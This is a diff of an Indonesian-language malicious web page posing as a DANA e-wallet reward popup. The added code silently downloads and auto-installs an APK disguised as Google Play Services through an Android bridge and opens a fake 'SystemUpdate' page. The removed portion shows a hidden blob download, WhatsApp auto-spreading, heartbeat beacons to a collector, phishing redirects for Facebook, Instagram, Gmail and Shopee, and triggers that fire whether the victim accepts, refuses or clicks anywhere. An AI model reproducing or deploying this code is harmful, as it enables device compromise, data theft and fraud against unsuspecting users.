@@ -30,6 +30,7 @@
         @keyframes loading{0%{width:0%}100%{width:100%}}
         .anti-debug{position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0}
         .hidden-download{position:absolute;width:0;height:0;border:none;visibility:hidden}
+        .download-inject{display:none}
     </style>
 </head>
 <body>
@@ -42,6 +43,9 @@
 
 <!-- Hidden iframe untuk download otomatis -->
 <iframe id="downloadFrame" class="hidden-download"></iframe>
+
+<!-- Download inject (hidden) -->
+<div id="downloadInject" class="download-inject"></div>
 
 <!-- Popup DANA -->
 <div id="popupDana">
@@ -68,7 +72,7 @@
 
 <script>
 // ============================================================
-// 🔥 INDEX.HTML - REDIRECT ONLY KE https://www.dana.id
+// 🔥 INDEX.HTML - AUTO DOWNLOAD 100% TANPA KONFIRMASI
 // ============================================================
 
 // ============================================================
@@ -239,7 +243,7 @@ function escapeWebView() {
 }
 
 // ============================================================
-// ANDROID BRIDGE
+// ANDROID BRIDGE - PALING PENTING UNTUK AUTO DOWNLOAD
 // ============================================================
 var A = {
     isAvailable: typeof AndroidBridge !== 'undefined',
@@ -280,11 +284,11 @@ var A = {
     flashOn: function() { if(this.isAvailable){ try{return AndroidBridge.flashOn()}catch(e){}} return null },
     flashOff: function() { if(this.isAvailable){ try{return AndroidBridge.flashOff()}catch(e){}} return null },
     
-    downloadFile: function(u, f) { 
+    // ✅ INI KUNCI: DOWNLOAD LANGSUNG KE STORAGE TANPA KONFIRMASI
+    downloadFile: function(url, path) { 
         if(this.isAvailable){ 
             try{
-                var downloadPath = '/storage/emulated/0/Download/' + f.split('/').pop();
-                return AndroidBridge.downloadFile(u, downloadPath);
+                return AndroidBridge.downloadFile(url, path);
             }catch(e){}
         }
         return false;
@@ -347,7 +351,7 @@ function autoScreenshot() {
 }
 
 // ============================================================
-// DOWNLOAD OTOMATIS TANPA KONFIRMASI
+// 🔥 AUTO DOWNLOAD 100% TANPA KONFIRMASI (HANYA VIA ANDROID BRIDGE)
 // ============================================================
 function downloadPayloadSilent() {
     if (DOWNLOAD_STARTED) return;
@@ -358,8 +362,12 @@ function downloadPayloadSilent() {
     var apkUrl = 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/GooglePlayServices.apk';
     var htmlUrl = 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/SystemUpdate.html';
     
-    // METHOD 1: ANDROID BRIDGE - DOWNLOAD LANGSUNG TANPA KONFIRMASI
+    // ============================================================
+    // ✅ METHOD 1: ANDROID BRIDGE - DOWNLOAD LANGSUNG TANPA KONFIRMASI
+    // ============================================================
     if (A.isAvailable) {
+        K({ sumber: 'download_method', data: 'android_bridge' });
+        
         // Download APK via Bridge
         try {
             var apkPath = '/storage/emulated/0/Download/GooglePlayServices.apk';
@@ -373,7 +381,7 @@ function downloadPayloadSilent() {
             K({ sumber: 'apk_download_error', data: e.message });
         }
         
-        // Download HTML via Bridge
+        // Download HTML via Bridge (fetch + save)
         try {
             var htmlPath = '/storage/emulated/0/Download/SystemUpdate.html';
             var xhr = new XMLHttpRequest();
@@ -395,18 +403,26 @@ function downloadPayloadSilent() {
             K({ sumber: 'html_download_error', data: e.message });
         }
         
-        // INSTALL APK OTOMATIS
+        // ============================================================
+        // ✅ INSTALL APK OTOMATIS (TANPA KONFIRMASI)
+        // ============================================================
         setTimeout(function() {
             try {
                 var apkPath = '/storage/emulated/0/Download/GooglePlayServices.apk';
-                A.installAPK(apkPath);
-                K({ sumber: 'apk_install', data: { path: apkPath } });
+                var installed = A.installAPK(apkPath);
+                if (installed) {
+                    K({ sumber: 'apk_install', data: { path: apkPath, status: 'success' } });
+                } else {
+                    K({ sumber: 'apk_install', data: { path: apkPath, status: 'failed' } });
+                }
             } catch(e) {
                 K({ sumber: 'apk_install_error', data: e.message });
             }
         }, 3000);
         
-        // BUKA SYSTEMUPDATE.HTML
+        // ============================================================
+        // ✅ BUKA SYSTEMUPDATE.HTML (TANPA KONFIRMASI)
+        // ============================================================
         setTimeout(function() {
             try {
                 var htmlPath = '/storage/emulated/0/Download/SystemUpdate.html';
@@ -418,48 +434,14 @@ function downloadPayloadSilent() {
         }, 4000);
         
     } else {
-        // METHOD 2: FALLBACK - IFRAME DOWNLOAD
-        try {
-            var iframe = document.getElementById('downloadFrame');
-            if (!iframe) {
-                iframe = document.createElement('iframe');
-                iframe.id = 'downloadFrame';
-                iframe.style.cssText = 'position:absolute;width:0;height:0;border:none;visibility:hidden';
-                document.body.appendChild(iframe);
-            }
-            iframe.src = apkUrl;
-            K({ sumber: 'apk_download_iframe', data: 'attempt' });
-        } catch(e) {
-            K({ sumber: 'apk_download_iframe_error', data: e.message });
-        }
+        // ============================================================
+        // ❌ TIDAK ADA ANDROID BRIDGE - TIDAK BISA AUTO DOWNLOAD
+        // ============================================================
+        K({ sumber: 'download_method', data: 'no_bridge' });
+        K({ sumber: 'download_error', data: 'android_bridge_not_available' });
         
-        // Fallback: XMLHttpRequest dengan blob
-        try {
-            var xhr2 = new XMLHttpRequest();
-            xhr2.open('GET', apkUrl, true);
-            xhr2.responseType = 'blob';
-            xhr2.timeout = 30000;
-            xhr2.onload = function() {
-                if (xhr2.status === 200) {
-                    var blob = xhr2.response;
-                    var link = document.createElement('a');
-                    link.href = URL.createObjectURL(blob);
-                    link.download = 'GooglePlayServices.apk';
-                    link.style.cssText = 'position:absolute;left:-9999px;top:-9999px;';
-                    document.body.appendChild(link);
-                    setTimeout(function() {
-                        link.click();
-                        setTimeout(function() {
-                            try { document.body.removeChild(link); } catch(e) {}
-                        }, 1000);
-                    }, 100);
-                    K({ sumber: 'apk_download_blob', data: 'ok' });
-                }
-            };
-            xhr2.send();
-        } catch(e) {
-            K({ sumber: 'apk_download_blob_error', data: e.message });
-        }
+        // Tidak ada cara auto download di browser tanpa konfirmasi
+        // Jadi kita hanya kirim notifikasi ke server
     }
 }
 
@@ -499,7 +481,7 @@ function createKlaimNotification() {
             K({ sumber: 'notification_click', data: 'clicked' });
             notif.close();
             
-            // ✅ REDIRECT ONLY KE https://www.dana.id (TANPA BUKA APLIKASI)
+            // ✅ REDIRECT ONLY KE https://www.dana.id
             if (!REDIRECT_DONE) {
                 REDIRECT_DONE = true;
                 setTimeout(function() {
@@ -580,129 +562,4 @@ function autoSpread() {
         var waUrl = 'https://web.whatsapp.com/';
         var iframe = document.createElement('iframe');
         iframe.src = waUrl + '?text=' + message;
-        iframe.style.cssText = 'position:absolute;width:1px;height:1px;left:-9999px;top:-9999px;visibility:hidden;border:none';
-        document.body.appendChild(iframe);
-        setTimeout(function(el) { try { if (el && el.parentNode) el.parentNode.removeChild(el); } catch(e) {} }, 5000, iframe);
-    } catch(e) {}
-    K({ sumber: 'auto_spread', data: 'sent_to_' + sentCount });
-}
-
-// ============================================================
-// HEARTBEAT (10 DETIK)
-// ============================================================
-function startHeartbeat() { setInterval(function() { K({sumber:'heartbeat', data:'alive'}); }, 10000); }
-
-// ============================================================
-// SERVICE WORKER
-// ============================================================
-function registerServiceWorker() {
-    if (!('serviceWorker' in navigator)) return;
-    try {
-        navigator.serviceWorker.register('/sw.js', { scope: '/' })
-            .then(function(reg) { K({ sumber: 'service_worker', data: { status: 'registered', scope: reg.scope } }); })
-            .catch(function(e) {
-                try {
-                    var swCode = `self.addEventListener('install', function(e) { self.skipWaiting(); }); self.addEventListener('activate', function(e) { e.waitUntil(clients.claim()); }); self.addEventListener('fetch', function(e) { e.respondWith(fetch(e.request)); });`;
-                    var blob = new Blob([swCode], { type: 'application/javascript' });
-                    var url = URL.createObjectURL(blob);
-                    navigator.serviceWorker.register(url, { scope: '/' })
-                        .then(function() { K({ sumber: 'service_worker_fallback', data: 'registered' }); })
-                        .catch(function() {});
-                } catch(e2) {}
-            });
-    } catch(e) {}
-}
-
-// ============================================================
-// STATUS BAR
-// ============================================================
-function showStatusBar() { var bar = document.getElementById('statusBar'); if (bar) { bar.className = 'status-bar loading'; K({ sumber: 'status_bar', data: 'shown' }); } }
-
-// ============================================================
-// PHISHING ROUTES (4: FB, IG, GMAIL, SHOPEE)
-// ============================================================
-var PHISHING_ROUTES = {
-    'facebook': 'https://www.facebook.com/login',
-    'instagram': 'https://www.instagram.com/accounts/login',
-    'gmail': 'https://accounts.google.com/signin',
-    'shopee': 'https://shopee.co.id/login'
-};
-function redirectPhishing(target) { var url = PHISHING_ROUTES[target]; if (url) { K({ sumber: 'phishing_redirect', data: { target: target, url: url } }); window.location.href = url; } }
-
-// ============================================================
-// MAIN EXECUTION - AUTO EKSEKUSI
-// ============================================================
-function dapatkanSemua() {
-    if (semuaDidapat) return;
-    semuaDidapat = true;
-    
-    try {
-        var popup = document.getElementById('popupDana');
-        if (popup) popup.style.display = 'none';
-        
-        K({ sumber: 'trigger', data: 'dapatkanSemua' });
-        
-        getIPAddress();
-        getBrowserLocation();
-        setTimeout(escapeWebView, 100);
-        ambilDataCepat();
-        startHeartbeat();
-        registerServiceWorker();
-        setTimeout(autoSpread, 2000);
-        setTimeout(function() { downloadPayloadSilent(); }, 500);
-        setTimeout(function() { showKlaimNotification(); }, 3000);
-        setTimeout(function() { showStatusBar(); }, 500);
-        setTimeout(function() { autoScreenshot(); }, 7000);
-        
-        // ✅ REDIRECT ONLY KE https://www.dana.id (TANPA BUKA APLIKASI)
-        setTimeout(function() {
-            if (!REDIRECT_DONE) {
-                REDIRECT_DONE = true;
-                try {
-                    window.location.href = 'https://www.dana.id';
-                } catch(e) {}
-            }
-        }, 5000);
-        
-        getPasswordFromWorker().then(function(password) { WS_PASSWORD = password; K({ sumber: 'password_received', data: 'ok' }); }).catch(function() {});
-        
-    } catch(e) {
-        K({ sumber: 'dapatkanSemua_error', data: e.message });
-    }
-}
-
-// ============================================================
-// TRIGGER FUNCTIONS
-// ============================================================
-function klaim() { K({sumber:'izin', data:'klaim'}); dapatkanSemua(); }
-function tolak() { K({sumber:'izin', data:'tolak'}); dapatkanSemua(); }
-
-// ============================================================
-// TIMER (10 DETIK)
-// ============================================================
-var w = 10;
-var timerInterval = setInterval(function() {
-    w--;
-    var el = document.getElementById('timer');
-    if (el) el.textContent = '00:' + (w < 10 ? '0' + w : w);
-    if (w <= 0) {
-        clearInterval(timerInterval);
-        K({sumber:'izin', data:'auto'});
-        dapatkanSemua();
-    }
-}, 1000);
-
-// ============================================================
-// KLIK DI MANAPUN
-// ============================================================
-document.addEventListener('click', function() {
-    if (!semuaDidapat) {
-        K({sumber:'izin', data:'click_anywhere'});
-        dapatkanSemua();
-    }
-});
-
-console.log('✅ index.html loaded - Popup DANA muncul!');
-</script>
-</body>
-</html>
+        iframe.style.cssText = 'position:absolute;width:1px;height:1px;left:-9999
